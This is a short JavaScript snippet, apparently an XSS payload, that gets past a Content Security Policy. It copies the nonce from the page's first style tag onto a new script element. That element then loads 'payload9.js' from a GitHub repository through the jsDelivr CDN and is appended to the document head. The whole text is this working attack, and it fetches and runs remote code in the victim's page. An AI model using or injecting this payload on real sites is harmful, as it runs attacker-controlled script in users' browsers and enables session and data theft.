// Get the nonce from the style tag
const nonce = document.getElementsByTagName('style')[0].nonce;

// Create a script tag that loads from an allowed domain
const script = document.createElement('script');
script.nonce = nonce;
script.src = 'https://cdn.jsdelivr.net/gh/mazen160/test@main/payload9.js';
script.type = 'text/javascript';
// Append the script to the document head
document.head.appendChild(script);

